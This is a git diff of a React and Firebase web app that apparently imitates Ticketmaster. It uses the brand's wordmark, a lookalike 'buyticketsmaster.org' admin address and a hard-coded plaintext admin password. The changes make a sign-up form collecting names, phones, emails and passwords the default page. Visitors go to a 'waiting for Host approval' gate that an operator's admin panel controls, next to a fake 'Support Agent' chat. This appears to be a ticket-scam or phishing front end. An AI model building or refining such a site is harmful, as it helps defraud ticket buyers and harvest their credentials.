@@ -26,12 +26,11 @@ const appId = import.meta.env.VITE_APP_ID || 'default-app-id';
 const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
 const ADMIN_PASS = "Ifeoluwapo@1!";
 
-// --- FULL TRANSLATIONS (4 LANGUAGES) ---
 const t = {
-  EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You", presaleTitle: "Early Access", unlock: "Unlock" },
-  ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante", presaleTitle: "Acceso Anticipado", unlock: "Desbloquear" },
-  DE: { heroTitle: "Die Größte Bühne.", verified: "Nur Verifiziert", btnJoin: "Beitreten", btnLogin: "Anmelden", holdTitle: "Überprüfung...", holdSub: "Bitte warten Sie auf den Host.", deniedTitle: "VERWEIGERT", deniedSub: "Zugriff abgelehnt.", queueTitle: "Fans vor Ihnen", presaleTitle: "Früher Zugang", unlock: "Freischalten" },
-  FR: { heroTitle: "La Plus Grande Scène.", verified: "Vérifié", btnJoin: "Rejoindre", btnLogin: "Connexion", holdTitle: "Vérification...", holdSub: "Veuillez patienter.", deniedTitle: "REFUSÉ", deniedSub: "Identité non vérifiée.", queueTitle: "Fans devant vous", presaleTitle: "Accès Anticipé", unlock: "Ouvrir" }
+  EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You" },
+  ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante" },
+  DE: { heroTitle: "Die Größte Bühne.", verified: "Nur Verifiziert", btnJoin: "Beitreten", btnLogin: "Anmelden", holdTitle: "Überprüfung...", holdSub: "Bitte warten Sie auf den Host.", deniedTitle: "VERWEIGERT", deniedSub: "Zugriff abgelehnt.", queueTitle: "Fans vor Ihnen" },
+  FR: { heroTitle: "La Plus Grande Scène.", verified: "Vérifié", btnJoin: "Rejoindre", btnLogin: "Connexion", holdTitle: "Vérification...", holdSub: "Veuillez patienter.", deniedTitle: "REFUSÉ", deniedSub: "Identité non vérifiée.", queueTitle: "Fans devant vous" }
 };
 
 const INITIAL_EVENTS = [
@@ -42,7 +41,7 @@ const INITIAL_EVENTS = [
 export default function App() {
   const [user, setUser] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
-  const [currentPage, setCurrentPage] = useState('home'); 
+  const [currentPage, setCurrentPage] = useState('auth'); // DEFAULT TO AUTH
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
   const [showCart, setShowCart] = useState(false);
@@ -96,13 +95,26 @@ export default function App() {
     }
   }, []);
 
-  // --- AUTH OBSERVER ---
+  // --- AUTH OBSERVER (Redirect Logic) ---
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
-        if (!u) { await signInAnonymously(auth); setIsLoading(false); } 
-        else { setUser(u); if (!u.isAnonymous && (currentPage === 'auth' || currentPage === 'home')) await findOrCreateSession(u); else setIsLoading(false); }
+        if (!u) { 
+            // If logged out, STAY ON AUTH PAGE unless Admin
+            if (currentPage !== 'admin') setCurrentPage('auth');
+            setIsLoading(false); 
+        } else { 
+            setUser(u); 
+            // If logged in, GO TO HOME (if currently on auth)
+            if (currentPage === 'auth') {
+                await findOrCreateSession(u);
+                setCurrentPage('home');
+            } else {
+                await findOrCreateSession(u);
+            }
+            setIsLoading(false); 
+        }
     });
-  }, [currentPage]);
+  }, []); // Run once on mount
 
   // --- SESSION LOGIC ---
   const findOrCreateSession = async (authUser, defaultStatus) => {
@@ -128,11 +140,11 @@ export default function App() {
       const snap = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid));
       if (snap.exists()) {
           const d = snap.data();
+          // Routing Logic for Gates
           if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('queue');
-          else if (d.status === 'waiting_approval' && currentPage === 'auth') setCurrentPage('waiting_room');
+          else if (d.status === 'waiting_approval') setCurrentPage('waiting_room');
+          else if (d.status === 'in_queue' && currentPage !== 'queue' && currentPage !== 'seatmap') setCurrentPage('queue');
       }
-      setIsLoading(false);
   };
 
   // --- USER DATA LISTENER ---
@@ -142,12 +154,18 @@ export default function App() {
       if(snap.exists()) {
         const d = snap.data();
         setSessionData(d);
+        
+        // Chat Logic
         const msgs = d.chatHistory || [];
         setChatMessages(msgs);
         if (msgs.length > 0 && msgs[msgs.length - 1].sender === 'system' && !isChatOpen) setHasUnread(true);
+
+        // Notification Logic
         const notifs = d.notifications || [];
         setUserNotifications(notifs);
         if(notifs.length > 0 && (!activeNotification || notifs[notifs.length-1].timestamp !== activeNotification?.timestamp)) setActiveNotification(notifs[notifs.length-1]);
+        
+        // Routing
         if (d.accessGranted === 'denied') setCurrentPage('denied');
         else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
       }
@@ -173,7 +191,7 @@ export default function App() {
     return () => { unsubSettings(); unsubEvents(); };
   }, [user]);
 
-  // --- ADMIN LISTENER ---
+  // --- ADMIN LISTENER (Safety Checks Added) ---
   useEffect(() => {
     if (!isAdminLoggedIn) return;
     return onSnapshot(query(collection(db, 'artifacts', appId, 'public', 'data', 'sessions'), orderBy('createdAt', 'desc')), (snap) => {
@@ -200,12 +218,12 @@ export default function App() {
   // --- ACTIONS ---
   const handleRealSignup = async () => {
       setAuthError(''); if (!tempUser.email || !tempUser.pass) return setAuthError('Missing fields');
-      try { const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await updateProfile(cred.user, { displayName: tempUser.name }); await findOrCreateSession(cred.user, 'waiting_approval'); setCurrentPage('waiting_room'); } catch (err) { setAuthError(err.message.replace('Firebase: ', '')); }
+      try { const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await updateProfile(cred.user, { displayName: tempUser.name }); } catch (err) { setAuthError(err.message.replace('Firebase: ', '')); }
   };
 
   const handleRealLogin = async () => {
       setAuthError(''); if (!tempUser.email || !tempUser.pass) return setAuthError('Missing fields');
-      try { const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); await findOrCreateSession(cred.user); } catch (err) { setAuthError("Invalid Login"); }
+      try { await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass); } catch (err) { setAuthError("Invalid Login"); }
   };
 
   const handleExitDenied = async () => { sessionStorage.clear(); await signOut(auth); window.location.reload(); };
@@ -251,6 +269,11 @@ export default function App() {
       await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'events', eid));
   };
 
+  const openChat = () => {
+      setIsChatOpen(true);
+      setHasUnread(false); // Clear Red Dot
+  };
+
   const updateSession = (updates) => { if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates); };
   
   const filteredEvents = eventsList.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
@@ -262,58 +285,42 @@ export default function App() {
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {/* HEADER */}
-      {!isAdminLoggedIn && (
+      {/* HEADER (Only show if Logged In & Not Admin) */}
+      {!isAdminLoggedIn && currentPage !== 'auth' && (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
                 {currentPage !== 'home' && <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 active:scale-95 transition-all"><ChevronLeft className="w-5 h-5" /></button>}
                 <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}><span className="font-extrabold text-xl tracking-tighter italic">ticketmaster</span><CheckCircle className="w-4 h-4 text-[#026cdf] fill-current" /></div>
             </div>
             <div className="flex items-center gap-4 z-20">
-                {/* User Notification Bell */}
                 <div className="relative">
                     <button onClick={() => setShowNotifPanel(!showNotifPanel)} className="p-2 hover:bg-white/10 rounded-full"><Bell className={`w-5 h-5 ${activeNotification ? 'text-red-500 animate-pulse' : 'text-gray-400'}`} /></button>
                     {activeNotification && <div className="absolute top-0 right-0 w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse border border-[#1f262d]" />}
                     {showNotifPanel && (
                         <div className="absolute top-12 right-0 w-72 bg-[#1f262d] border border-white/10 rounded-2xl shadow-2xl p-4 animate-slideDown max-h-60 overflow-y-auto">
                             <h4 className="text-xs font-black uppercase tracking-widest text-gray-500 mb-4">Priority Alerts</h4>
-                            {userNotifications.length === 0 ? <p className="text-xs text-gray-500 text-center">No alerts yet</p> : 
-                                userNotifications.map((n, i) => (
-                                    <div key={i} className="mb-3 pb-3 border-b border-white/5 last:border-0"><p className="text-xs font-bold text-white">{n.text}</p><p className="text-[10px] text-gray-500 mt-1">{new Date(n.timestamp).toLocaleTimeString()}</p></div>
-                                ))
-                            }
+                            {userNotifications.length === 0 ? <p className="text-xs text-gray-500 text-center">No alerts yet</p> : userNotifications.map((n, i) => (<div key={i} className="mb-3 pb-3 border-b border-white/5 last:border-0"><p className="text-xs font-bold text-white">{n.text}</p><p className="text-[10px] text-gray-500 mt-1">{new Date(n.timestamp).toLocaleTimeString()}</p></div>))}
                         </div>
                     )}
                 </div>
-
                 {currentPage === 'home' && (<><button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white"><Search className="w-5 h-5" /></button><div className="hidden lg:flex relative group"><input className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black" placeholder="Search..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /><Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" /></div></>)}
                 <div className="relative"><button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all"><span>{flags[lang]}</span><span>{lang}</span></button>{showLangMenu && <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">{Object.keys(flags).map(l => (<button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>))}</div>}</div>
-                {/* Removed extra User Icon here as requested */}
             </div>
             {showMobileSearch && currentPage === 'home' && <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10"><input autoFocus className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none" placeholder="Search events..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /></div>}
         </header>
       )}
 
       <main className={`min-h-screen ${!isAdminLoggedIn ? 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto' : 'bg-[#f1f5f9] text-gray-900'}`}>
-        {currentPage === 'home' && (
-          <div className="space-y-10 animate-fadeIn">
-            <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
-              <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
-              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
-            </div>
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
-          </div>
-        )}
-
-        {/* AUTH (Restored Headings) */}
+        
+        {/* AUTH (Now the Default Landing Page) */}
         {currentPage === 'auth' && (
-           <div className="min-h-[70vh] flex items-center justify-center p-4">
+           <div className="fixed inset-0 z-50 bg-[#0a0e14] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
-                 <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter">{authMode==='signup'?txt.verifyTitle:txt.loginTitle}</h2><p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{authMode==='signup'?txt.verifySub:txt.loginSub}</p></div>
+                 <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup'?txt.verifyTitle:txt.loginTitle}</h2><p className="text-xs font-bold text-gray-500 uppercase tracking-widest">{authMode==='signup'?txt.verifySub:txt.loginSub}</p></div>
                  <div className="space-y-3">
-                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
-                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
-                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
+                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
+                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none" placeholder={txt.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
                      {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-500">{txt.agree}</p></div>}
                  </div>
                  {authError && <p className="text-center text-red-500 font-bold text-xs">{authError}</p>}
@@ -321,6 +328,17 @@ export default function App() {
                  <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-400 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? txt.haveAcc : txt.noAcc}</button></div>
               </div>
            </div>
+        )}
+
+        {/* HOME */}
+        {currentPage === 'home' && (
+          <div className="space-y-10 animate-fadeIn">
+            <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
+              <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
+              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
+            </div>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'waiting_approval' }); setCurrentPage('waiting_room'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
+          </div>
         )}
 
         {currentPage === 'waiting_room' && (
@@ -354,24 +372,6 @@ export default function App() {
                <div className="space-y-4"><h2 className="text-6xl lg:text-9xl font-black italic text-white tracking-tighter leading-none">{queuePosition}</h2><p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.queueTitle}</p></div>
                <div className="w-full max-w-md bg-white/5 h-4 rounded-full overflow-hidden relative border border-white/10"><div className="h-full bg-[#026cdf] transition-all duration-1000 shadow-[0_0_20px_#026cdf]" style={{ width: `${queueProgress}%` }} /></div>
            </div>
-        )}
-
-        {/* CLICKABLE CART */}
-        {showCart && (
-            <div className="fixed inset-0 z-[300] bg-black/80 flex items-center justify-center p-4 animate-fadeIn">
-                <div className="bg-[#1f262d] w-full max-w-md rounded-3xl p-6 border border-white/10 shadow-2xl">
-                    <div className="flex justify-between items-center mb-6"><h3 className="text-xl font-black uppercase italic">Your Cart</h3><button onClick={() => setShowCart(false)}><X className="w-6 h-6 text-gray-400" /></button></div>
-                    <div className="space-y-3 max-h-60 overflow-y-auto">
-                        {cart.length === 0 ? <p className="text-gray-500 text-center text-xs uppercase tracking-widest">Cart is empty</p> : cart.map(c => (
-                            <div key={c.id} className="flex justify-between items-center bg-white/5 p-3 rounded-xl">
-                                <div><p className="font-bold text-xs text-white">{c.label}</p><p className="text-[10px] text-[#026cdf] font-black">${c.price}</p></div>
-                                <button onClick={() => setCart(cart.filter(x => x.id !== c.id))} className="text-red-500 hover:text-red-400"><Trash2 className="w-4 h-4" /></button>
-                            </div>
-                        ))}
-                    </div>
-                    {cart.length > 0 && <button onClick={() => { setShowCart(false); setCurrentPage('checkout'); }} className="w-full bg-[#026cdf] text-white py-4 rounded-xl font-black uppercase mt-6">Checkout Now</button>}
-                </div>
-            </div>
         )}
 
         {currentPage === 'seatmap' && <SeatMap event={selectedEvent} regularPrice={globalSettings.regularPrice} vipPrice={globalSettings.vipPrice} cart={cart} setCart={setCart} onCheckout={() => setCurrentPage('checkout')} />}
@@ -425,7 +425,7 @@ export default function App() {
                               </div>
                           </div>
                       ) : (
-                          allSessions.filter(s => adminTab==='requests' ? s.status==='waiting_approval' : s.status!=='waiting_approval').map(s => (
+                          (allSessions || []).filter(s => adminTab==='requests' ? s.status==='waiting_approval' : s.status!=='waiting_approval').map(s => (
                               <div key={s.id} onClick={() => setSelectedUser(s)} className={`p-4 rounded-xl cursor-pointer hover:bg-gray-50 transition-all border ${selectedUser?.id === s.id ? 'border-[#026cdf] bg-blue-50' : 'border-transparent'}`}>
                                   <div className="flex justify-between items-center mb-1"><h4 className="font-bold text-sm truncate">{s.name}</h4>{s.status==='waiting_approval' && <span className="bg-orange-100 text-orange-600 text-[9px] font-black px-2 py-0.5 rounded-full uppercase">Wait</span>}</div>
                                   <p className="text-xs text-gray-400 truncate">{s.email}</p>
@@ -455,7 +455,7 @@ export default function App() {
         )}
       </main>
 
-      {!isAdminLoggedIn && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
+      {!isAdminLoggedIn && currentPage !== 'auth' && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={openChat} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
       
       {isChatOpen && <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp"><div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10"><div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div><div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div></div><div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">{chatMessages.map((m,i) => (<div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}><div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div></div>))}</div><div className="p-3 bg-white border-t flex gap-2"><input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." /><button onClick={() => { const el = document.getElementById('chat-inp'); if(el.value.trim()) { const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}]; setChatMessages(newHistory); updateSession({ chatHistory: newHistory }); el.value = ''; } }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button></div></div>}
       
